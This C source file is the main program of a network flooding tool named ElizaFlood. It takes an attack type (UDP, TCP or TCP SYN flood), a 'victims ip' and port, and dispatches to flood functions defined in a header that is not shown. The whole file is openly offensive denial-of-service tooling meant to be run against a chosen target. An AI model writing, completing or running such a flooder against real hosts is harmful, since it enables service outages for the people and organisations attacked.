#include "elizaFlood.h"

void printUsage() {
    printf("===============================================\n");
    printf("| ./ElizaFlood [attack type] [address] [port] |\n");
    printf("|=============================================|\n");
    printf("| [attack type]: udp, tcp, tcp-syn            |\n");
    printf("| [adress]: victims ip                        |\n");
    printf("| [port]: victims port                        |\n");
    printf("===============================================\n\n");
}

int main(int argv, char *argc[]) {
    if(argv != 4) {
        printf("ERROR: Wrong number of arguments!\n\n");
        printUsage();
        exit(0);
    }
    if(strcmp(argc[1], "udp") == 0) {
		udp_flood(argc[2], atoi(argc[3]), "blabla", 1);
    }
    else if(strcmp(argc[1], "tcp-syn") == 0) {
        tcpsyn_flood(argc[2], atoi(argc[3]), "blabla", 1);
    }
    else if(strcmp(argc[1], "tcp") == 0) {
        tcp_flood(argc[2], atoi(argc[3]), "blabla", 1);
    }
    else {
        printf("ERROR: Attack type unknown!\n\n");
        printUsage();
    }
    return 0;
}
